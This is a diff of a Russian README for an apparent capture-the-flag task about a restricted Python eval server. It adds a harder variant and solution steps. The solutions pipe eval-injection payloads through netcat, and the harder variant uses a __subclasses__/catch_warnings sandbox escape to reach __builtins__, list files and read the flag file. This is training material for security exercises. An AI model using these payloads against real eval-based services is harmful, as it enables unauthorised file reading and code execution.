@@ -8,9 +8,11 @@ Python eval
 Файлы
 -----
 1. **eval.py** - Исходный код
-2. **159fe327e79316e0f9169fa326fafbd1.txt** - Файл с флагом
-3. **blacklist.txt** - Файл с запрещенными словами
-4. **server.py** - Псевдо исходный код, который доступен участникам
+2. **eval2.py** - Исходный код "harder" версии
+3. **159fe327e79316e0f9169fa326fafbd1.txt** - Файл с флагом
+4. **blacklist.txt** - Файл с запрещенными словами
+5. **server.py** - Псевдо исходный код, который доступен участникам
+6. **server2.py** - Псевдо исходный код для "harder", который доступен участникам
 
 Запуск
 ------
@@ -24,17 +26,35 @@ timeout - Время жизни одного процесса, по умолча
 
 ---
 
-[Описание проблемы](https://habrahabr.ru/post/221937/)
+[Описание проблемы](https://habrahabr.ru/post/221937/)  
+Единственное отличие "harder" версии от обычной в том, что теперь закрыт доступ не только к глобальным переменным, но и к \__builtins__
 
 ---
 
 Решение
 -------
-1. получить список файлов в папке  
+1. Получить список файлов в папке  
     ```
     echo "__import__('os').listdir()" | nc адрес порт
     ```
 2. Прочесть флаг  
     ```
     echo "open('имя файла с флагом').read()" | nc адрес порт
+    ```  
+
+Решение "harder" версии
+------------------
+1. Получить доступ к встроенным \__builtins__  
     ```
+    [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
+    ```
+2. Получить список файлов в папке  
+    ```
+    echo "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').listdir()" | nc адрес порт
+    ```
+3. Прочесть флаг  
+    ```
+    echo "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('имя файла с флагом').read()" | nc адрес порт
+    ```
+
+[Источник](https://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals#thing_t1_c1v372r)
